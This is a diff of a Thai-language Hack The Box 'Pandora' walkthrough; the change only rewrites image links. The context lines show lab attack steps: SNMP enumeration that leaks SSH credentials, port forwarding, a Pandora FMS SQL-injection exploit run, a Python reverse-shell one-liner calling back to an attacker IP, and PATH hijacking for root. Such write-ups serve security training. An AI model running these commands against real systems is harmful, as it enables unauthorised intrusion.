@@ -45,7 +45,7 @@ Nmap done: 1 IP address (1 host up) scanned in 56.56 seconds
 
 ## HTTP 80 
 
-![[Challenge/HTB Challenge/Pandora/IMG/001.png]]
+![](./IMG/001.png)
 
 ซึ่งหลังจากลองทดสอบ Fuzzing ไปแล้วก็ไม่พบอะไรที่น่าสนใจ 
 
@@ -60,12 +60,12 @@ snmpwalk -v 2c -c public 10.10.11.136 | tee snmp-full
 ```
 
 ไม่นานเราก็เจอข้อมูลของ user: daniel:HotelBabylon23  
-![[Challenge/HTB Challenge/Pandora/IMG/002.png]]
+![](./IMG/002.png)
 
 ## Shell as daniel 
 
 จากนั้นลองทดสอบ ssh จะพบว่าสามารถเข้าถึง daniel ได้ด้วยข้อมูลที่ได้ daniel:HotelBabylon23   
-![[Challenge/HTB Challenge/Pandora/IMG/003.png]]
+![](./IMG/003.png)
 
 ## Host Enum 
 
@@ -93,15 +93,15 @@ daniel@pandora:/etc/apache2/sites-available$ cat pandora.conf
 ssh -N -L 0.0.0.0:10001:localhost:80 daniel@panda.htb # on Kali host 
 ```
 
-![[Challenge/HTB Challenge/Pandora/IMG/004.png]]
+![](./IMG/004.png)
 
 จากข้อมูลของเป้าหมายจะพบว่าเว็ยไซต์ดังกล่าวมีการใช้งานเวอร์ชัน v7.0NG.742_FIX_PERL2020
 
-![[Challenge/HTB Challenge/Pandora/IMG/005.png]]
+![](./IMG/005.png)
 
 ทั้งนี้ช่องโหว่ดังกล่าวจำเป็นต้องใช้ Authentication ซึ่งจากการทดสอบใช้ Daniel ก็ไม่สามารถเข้าใช้งานได้ ทำให้ Exploit ดังกล่าวไม่สามารถใช้ได้ 
 
-![[Challenge/HTB Challenge/Pandora/IMG/006.png]]
+![](./IMG/006.png)
 
 
 ## Exploit Pandora v7
@@ -109,7 +109,7 @@ ssh -N -L 0.0.0.0:10001:localhost:80 daniel@panda.htb # on Kali host
 python3 sqlpwn.py -t 'pandora.panda.htb:10001' -f 'shell.php'
 ```
 
-![[Challenge/HTB Challenge/Pandora/IMG/007.png]]
+![](./IMG/007.png)
 
 ## Shell as matt
 
@@ -118,9 +118,9 @@ python3 sqlpwn.py -t 'pandora.panda.htb:10001' -f 'shell.php'
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.30",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
-![[Challenge/HTB Challenge/Pandora/IMG/008.png]]
+![](./IMG/008.png)
 
-![[Challenge/HTB Challenge/Pandora/IMG/009.png]]
+![](./IMG/009.png)
 
 ```python 
 python3 -c 'import pty;pty.spawn("/bin/bash_")'
@@ -132,7 +132,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash_")'
 find / -perm -4000 -ls 2>/dev/null
 ```
 
-![[Challenge/HTB Challenge/Pandora/IMG/010.png]]
+![](./IMG/010.png)
 
 
 จากนั้นให้สร้าง public กับ private key สำหรับเข้าไปยังเครื่องด้วยสิทธิของ matt ทั้งนี้เพื่อแก้ปัญหาการรัน sudo -l ไม่ได้ นั่นเอง 
@@ -195,5 +195,5 @@ chmod +x tar
 pandora_backup 
 ```
 
-![[Challenge/HTB Challenge/Pandora/IMG/011.png]]
+![](./IMG/011.png)
 # PWNED 
